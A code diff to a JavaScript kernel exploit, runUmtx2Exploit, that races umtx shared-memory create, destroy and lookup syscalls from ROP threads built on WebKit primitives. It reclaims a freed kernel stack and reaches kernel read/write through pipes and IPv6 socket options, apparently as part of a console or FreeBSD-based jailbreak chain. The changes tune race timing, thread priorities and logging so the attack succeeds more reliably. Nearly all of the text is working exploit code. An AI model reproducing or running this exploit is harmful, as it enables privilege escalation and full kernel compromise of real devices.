@@ -34,13 +34,14 @@
  * @param {WebkitPrimitives} p 
  * @param {worker_rop} chain 
  * @param {function(string, LogLevel):Promise<void>} [log] 
- * @returns 
+ * @returns {Promise<KernelRW>}
  */
 async function runUmtx2Exploit(p, chain, log = async () => { }) {
     const totalStartTime = performance.now();
 
     const debug = false;
     const doInvalidKstackMunmap = true;
+    const doYieldAtDestroyWait = false;
 
     /**
      * @param {number} ms 
@@ -68,7 +69,7 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
 
     const config = {
         max_attempts: 100,
-        max_race_attempts: 512,
+        max_race_attempts: 0x400,
         num_spray_fds: 0x28,
         num_kprim_threads: 0x180,
     };
@@ -77,7 +78,7 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
         main_thread: { core: 11, prio: 256 },
         destroyer_thread0: { core: 13, prio: 256 },
         destroyer_thread1: { core: 14, prio: 256 },
-        lookup_thread: { core: 15, prio: 767 },
+        lookup_thread: { core: 15, prio: 400 },
         reclaim_thread: { core: -1, prio: 450 }
     }
 
@@ -236,9 +237,11 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
      * @param {number} branch_type 
      * @param {int64|number} compare_value 
      */
-    function threadWaitWhile(thread, addr, branch_type, compare_value, dereference_compare_value = false) {
+    function threadWaitWhile(thread, addr, branch_type, compare_value, dereference_compare_value = false, yield = true) {
         thread.while(addr, branch_type, compare_value, dereference_compare_value, () => {
-            thread.self_healing_syscall(SYS_SCHED_YIELD);
+            if (yield) {
+                thread.self_healing_syscall(SYS_SCHED_YIELD);
+            }
         });
     }
 
@@ -283,6 +286,29 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
         EXITED: 3
     };
 
+    const destroyerThread0Data = {
+        status: alloc(0x4),
+        cpu: alloc(0x8),
+        counter: alloc(0x8),
+        destroyCount: alloc(0x8),
+        shmOpCount: alloc(0x8),
+
+        resStore: alloc(0x8),
+        ftruncateSize: alloc(0x8)
+    };
+
+    
+    const destroyerThread1Data = {
+        status: alloc(0x4),
+        cpu: alloc(0x8),
+        counter: alloc(0x8),
+        destroyCount: alloc(0x8),
+        shmOpCount: alloc(0x8),
+
+        resStore: alloc(0x8),
+        ftruncateSize: alloc(0x8)
+    };
+
     const lookupThreadData = {
         status: alloc(0x4),
         cpu: alloc(0x8),
@@ -309,7 +335,7 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
         lookupThread.while(commonThreadData.exit, lookupThread.branch_types.EQUAL, 0, false, () => {
             lookupThread.push_write4(lookupThreadData.status, threadStatus.READY);
 
-            threadWaitWhile(lookupThread, commonThreadData.start, lookupThread.branch_types.EQUAL, 0);
+            threadWaitWhile(lookupThread, commonThreadData.start, lookupThread.branch_types.EQUAL, 0, false, doYieldAtDestroyWait);
 
             lookupThread.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_LOOKUP, primaryShmKeyBuf);
             lookupThread.write_result(lookupThreadData.fd);
@@ -328,16 +354,7 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
         lookupThread.push_write4(lookupThreadData.status, threadStatus.EXITED);
     }
 
-    const destroyerThread0Data = {
-        status: alloc(0x4),
-        cpu: alloc(0x8),
-        counter: alloc(0x8),
-        destroyCount: alloc(0x8),
-        shmOpCount: alloc(0x8),
 
-        resStore: alloc(0x8),
-        ftruncateSize: alloc(0x8)
-    };
     const destroyerThread0 = new thread_rop(p, chain, "rop_thread_destroyer0");
     function resetDestroyerThread0State() {
         p.write4(destroyerThread0Data.status, threadStatus.DEFAULT);
@@ -347,16 +364,6 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
         p.write4(destroyerThread0Data.shmOpCount, 0);
     }
 
-    const destroyerThread1Data = {
-        status: alloc(0x4),
-        cpu: alloc(0x8),
-        counter: alloc(0x8),
-        destroyCount: alloc(0x8),
-        shmOpCount: alloc(0x8),
-
-        resStore: alloc(0x8),
-        ftruncateSize: alloc(0x8)
-    };
     const destroyerThread1 = new thread_rop(p, chain, "rop_thread_destroyer1");
     function resetDestroyerThread1State() {
         p.write4(destroyerThread1Data.status, threadStatus.DEFAULT);
@@ -379,7 +386,7 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
         destroyerThread0.while(commonThreadData.exit, destroyerThread0.branch_types.EQUAL, 0, false, () => {
             destroyerThread0.push_write4(destroyerThread0Data.status, threadStatus.READY);
 
-            threadWaitWhile(destroyerThread0, commonThreadData.start, destroyerThread0.branch_types.EQUAL, 0);
+            threadWaitWhile(destroyerThread0, commonThreadData.start, destroyerThread0.branch_types.EQUAL, 0, false, doYieldAtDestroyWait);
 
             // do the destroy
             destroyerThread0.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_DESTROY, primaryShmKeyBuf);
@@ -441,7 +448,7 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
         destroyerThread1.while(commonThreadData.exit, destroyerThread1.branch_types.EQUAL, 0, false, () => {
             destroyerThread1.push_write4(destroyerThread1Data.status, threadStatus.READY);
 
-            threadWaitWhile(destroyerThread1, commonThreadData.start, destroyerThread1.branch_types.EQUAL, 0);
+            threadWaitWhile(destroyerThread1, commonThreadData.start, destroyerThread1.branch_types.EQUAL, 0, false, doYieldAtDestroyWait);
 
             // do the destroy
             destroyerThread1.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_DESTROY, primaryShmKeyBuf);
@@ -546,7 +553,7 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
     async function resetKprimThreads() {
         await resetKprimThreadsState();
 
-        const timeout = 1; // sec
+        const timeoutMs = 250;
 
         for (let i = 0; i < config.num_kprim_threads; i++) {
             const currentThreadStatusAddr = kprimCommonData.status.add32(i * 0x4);
@@ -565,7 +572,8 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
                     timeval: alloc(0x10)
                 };
 
-                p.write8(kprimThreads[i].customData.timeval, timeout);
+                p.write8(kprimThreads[i].customData.timeval, 0);
+                p.write8(kprimThreads[i].customData.timeval.add32(0x8), timeoutMs * 1000);
             }
 
             /** @type {thread_rop} */
@@ -619,7 +627,7 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
 
     async function waitForRaceThreadsState(state) {
         while (true) {
-            await new Promise((resolve) => setTimeout(resolve, 2));
+            await new Promise((resolve) => setTimeout(resolve, 1));
 
             const lookupThreadStatus = p.read4(lookupThreadData.status);
             if (lookupThreadStatus != state) {
@@ -773,8 +781,10 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
 
     let checkMemoryAccessFailCount = 0;
 
+    await log("Triggering race...", LogLevel.LOG);
+
     for (let i = 1; i <= config.max_attempts; i++) {
-        await log(`Attempt ${i}`, LogLevel.LOG);
+        // await log(`Attempt ${i}`, LogLevel.LOG);
 
         resetLookupThreadRop();
         resetDestroyerThread0Rop();
@@ -803,10 +813,9 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
         const mainFdSizeBuf = alloc(0x8);
 
         const beforeRaceTime = performance.now();
-        await log("Triggering race...", LogLevel.LOG);
 
         for (let i2 = 0; i2 < config.max_race_attempts; i2++) {
-            if (i2 % 2 == 0) {
+            if (i2 % 10 == 0) {
                 if (debug) {
                     await log(`Race attempt ${i}-${i2} (mem access fail count: ${checkMemoryAccessFailCount})`, LogLevel.INFO | LogLevel.FLAG_TEMP);
                 } else {
@@ -814,7 +823,6 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
                 }
             }
 
-            // const step1Start = performance.now();
             // umtx_shm_create
             chain.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_CREAT, primaryShmKeyBuf);
             chain.write_result(mainFdBuf);
@@ -826,34 +834,25 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
             });
 
             await chain.run();
-            // const step1End = performance.now();
 
-            // const step2Start = performance.now();
             await waitForRaceThreadsState(threadStatus.READY);
-            // const step2End = performance.now();
 
-            // const step3Start = performance.now();
             p.write8(commonThreadData.resume, 0);
             p.write8(commonThreadData.start, 1);
-            // const step3End = performance.now();
 
-            // const step4Start = performance.now();
             await waitForRaceThreadsState(threadStatus.DONE);
-            // const step4End = performance.now();
 
-            // const step5Start = performance.now();
             let destroyCount = p.read4(destroyerThread0Data.destroyCount) + p.read4(destroyerThread1Data.destroyCount);
 
             let lookupFd = p.read4(lookupThreadData.fd) << 0;
-            // const step5End = performance.now();
 
-            // const step6Start = performance.now();
-            const fd = await getShmFdFromSize(lookupFd);
-            // const step6End = performance.now();
-            if (fd) {
-                winnerFd = fd;
-                winnerLookupFd = lookupFd;
-                await log(`overlapped shm regions! winner_fd = ${winnerFd}`, LogLevel.LOG);
+            if (destroyCount == 2) {
+                const fd = await getShmFdFromSize(lookupFd);
+                if (fd) {
+                    winnerFd = fd;
+                    winnerLookupFd = lookupFd;
+                    await log(`overlapped shm regions! winner_fd = ${winnerFd}`, LogLevel.LOG);
+                }
             }
 
             // dont close lookup descriptor right away when it is possibly corrupted
@@ -861,7 +860,6 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
                 fdsToFix.push(lookupFd);
             }
 
-            // const step7Start = performance.now();
             // close other fds
             for (let i3 = 0; i3 < (config.num_spray_fds * 2); i3++) {
                 const addr = sprayFdsBuf.add32(0x8 * i3);
@@ -872,41 +870,28 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
                 chain.push_write8(addr, 0);
             }
             await chain.run();
-            // const step7End = performance.now();
 
             // we have won the race
             if (winnerFd) {
                 break;
             }
 
-            // const step8Start = performance.now();
             await resetCommonData();
             resetLookupThreadState();
             resetDestroyerThread0State();
             resetDestroyerThread1State();
-            // const step8End = performance.now();
 
             if (i2 !== config.max_race_attempts - 1) {
                 p.write8(commonThreadData.resume, 1);
             }
 
-            // alert(`Race step times:\n` +
-            //     `1: ${toHumanReadableTime(step1End - step1Start)}  | ` +
-            //     `2: ${toHumanReadableTime(step2End - step2Start)}  | ` +
-            //     `3: ${toHumanReadableTime(step3End - step3Start)}  | ` +
-            //     `4: ${toHumanReadableTime(step4End - step4Start)}  | ` +
-            //     `5: ${toHumanReadableTime(step5End - step5Start)}  | ` +
-            //     `6: ${toHumanReadableTime(step6End - step6Start)}  | ` +
-            //     `7: ${toHumanReadableTime(step7End - step7Start)}  | ` +
-            //     `8: ${toHumanReadableTime(step8End - step8Start)}`);
-
             count++;
         }
 
         if (count != config.max_race_attempts) {
-            await log(`Race won after ${count} attempts`, LogLevel.INFO);
+            if (debug) await log(`Race won after ${count} attempts`, LogLevel.INFO);
         } else {
-            await log("Race max attempts reached, retrying...", LogLevel.INFO);
+            if (debug) await log("Race max attempts reached, retrying...", LogLevel.INFO);
         }
 
         const afterRaceTime = performance.now();
@@ -930,7 +915,7 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
         // we have 2 fd referencing a shmfd which will be freed if we close 1 fd
         let closeRes = await chain.syscall_int32(SYS_CLOSE, winnerFd);
         if (closeRes != 0) {
-            if (debug) await log("Failed to close winnerFd", LogLevel.ERROR);
+            await log("Failed to close winnerFd", LogLevel.WARN);
             continue;
         }
 
@@ -972,7 +957,7 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
 
         kstacksToFix.push(kstack);
 
-        await log(`Managed to reclaim kstack with mmap. kstack = ${kstack.toString(16)}`, LogLevel.INFO);
+        if (debug) await log(`Managed to reclaim kstack with mmap. kstack = ${kstack.toString(16)}`, LogLevel.INFO);
 
         // change memory protections to r/w
         const PROT_READ = 0x1;
@@ -987,7 +972,7 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
             continue;
         }
 
-        await log("Managed to modify kstack memory protection to r/w", LogLevel.INFO);
+        if (debug) await log("Managed to modify kstack memory protection to r/w", LogLevel.INFO);
 
         // check if we have access to the page
         const checkRes = await checkMemoryAccess(kstack);
@@ -998,7 +983,7 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
                 await chain.syscall(SYS_MUNMAP, kstack, 0x4000);
             }
             kstack = null;
-            await new Promise((resolve) => setTimeout(resolve, 1000));
+            await new Promise((resolve) => setTimeout(resolve, 100));
             continue;
         }
 
@@ -1122,6 +1107,7 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
     const PHYS_PAGE_SIZE = 0x1000;
 
     const kstackKrwReadBuf = alloc(0x8);
+
     async function kstackKrwReadQword(kaddr) {
         // fill up pipe
         for (let i = 0; i < PIPE_SIZE; i += PHYS_PAGE_SIZE) {
@@ -1130,17 +1116,17 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
         await chain.run();
 
         p.write8(kprimCommonData.cmd, kstackKernelRwCmd.READ_QWORD);
-        await new Promise((resolve) => setTimeout(resolve, 10)); // wait a while until kernel stack is populated
-
-        await updateIovInKstack(pipe_buf, kaddr, 1, 1, 8);
+        await new Promise((resolve) => setTimeout(resolve, 15)); // wait a while until kernel stack is populated
+        
+        updateIovInKstack(pipe_buf, kaddr, 1, 1, 8);
 
         await chain.syscall(SYS_READ, pipeSlowReadFd, pipe_buf, PIPE_SIZE); // read garbage
-        await chain.syscall(SYS_READ, pipeSlowReadFd, kstackKrwReadBuf, 8); // read kernel data
 
         while (p.read4(kprimCommonData.cmd) != kstackKernelRwCmd.NOP) {
-            await new Promise((resolve) => setTimeout(resolve, 10));
+            await new Promise((resolve) => setTimeout(resolve, 1));
         }
 
+        await chain.syscall(SYS_READ, pipeSlowReadFd, kstackKrwReadBuf, 8); // read kernel data
         return p.read8(kstackKrwReadBuf);
     }
 
@@ -1156,9 +1142,9 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
 
         // will hang until we write
         p.write8(kprimCommonData.cmd, kstackKernelRwCmd.WRITE_QWORD);
-        await new Promise((resolve) => setTimeout(resolve, 10)); // wait a while until kernel stack is populated
+        await new Promise((resolve) => setTimeout(resolve, 15)); // wait a while until kernel stack is populated
 
-        await updateIovInKstack(pipe_buf, kaddr, 1, 0, 8);
+        updateIovInKstack(pipe_buf, kaddr, 1, 0, 8);
 
         await chain.syscall(SYS_WRITE, pipeSlowWriteFd, kstackKrwWriteBuf, 8);
 
@@ -1172,13 +1158,21 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
     const OFFSET_P_UCRED = 0x40;
     const OFFSET_FDESCENTTBL_FDT_OFILES = 0x8;
 
+    
+    if (debug) await log("getKprimCurthrFromKstack...", LogLevel.DEBUG);
     const kprimCurthr = getKprimCurthrFromKstack(kstack);
+    if (debug) await log(`kprimCurthr = ${kprimCurthr.toString(16)}`, LogLevel.DEBUG);
     const curproc = await kstackKrwReadQword(kprimCurthr.add32(OFFSET_THREAD_TD_PROC));
+    if (debug) await log(`curproc = ${curproc.toString(16)}`, LogLevel.DEBUG);
     const curprocUcred = await kstackKrwReadQword(curproc.add32(OFFSET_P_UCRED));
+    if (debug) await log(`curprocUcred = ${curprocUcred.toString(16)}`, LogLevel.DEBUG);
     const curprocFd = await kstackKrwReadQword(curproc.add32(OFFSET_P_FD));
+    if (debug) await log(`curprocFd = ${curprocFd.toString(16)}`, LogLevel.DEBUG);
     const fdescenttbl = await kstackKrwReadQword(curprocFd);
+    if (debug) await log(`fdescenttbl = ${fdescenttbl.toString(16)}`, LogLevel.DEBUG);
     const curprocNfilesAddr = fdescenttbl;
     const curprocOfiles = fdescenttbl.add32(OFFSET_FDESCENTTBL_FDT_OFILES); // account for fdt_nfiles
+    if (debug) await log(`curprocOfiles = ${curprocOfiles.toString(16)}`, LogLevel.DEBUG);
 
 
     const AF_INET = 2;
@@ -1200,8 +1194,9 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
     const pktinfoSizeStore = p.malloc(0x8, 1);
     p.write8(pktinfoSizeStore, PKTINFO_SIZE);
 
-    await chain.syscall(SYS_SETSOCKOPT, masterSock, IPPROTO_IPV6, IPV6_PKTINFO, masterBuffer, PKTINFO_SIZE);
-    await chain.syscall(SYS_SETSOCKOPT, victimSock, IPPROTO_IPV6, IPV6_PKTINFO, slaveBuffer, PKTINFO_SIZE);
+    chain.add_syscall(SYS_SETSOCKOPT, masterSock, IPPROTO_IPV6, IPV6_PKTINFO, masterBuffer, PKTINFO_SIZE);
+    chain.add_syscall(SYS_SETSOCKOPT, victimSock, IPPROTO_IPV6, IPV6_PKTINFO, slaveBuffer, PKTINFO_SIZE);
+    await chain.run();
 
     const masterSockFileDescAddr = curprocOfiles.add32(masterSock * 0x30);
     const victimSockFileDescAddr = curprocOfiles.add32(victimSock * 0x30);
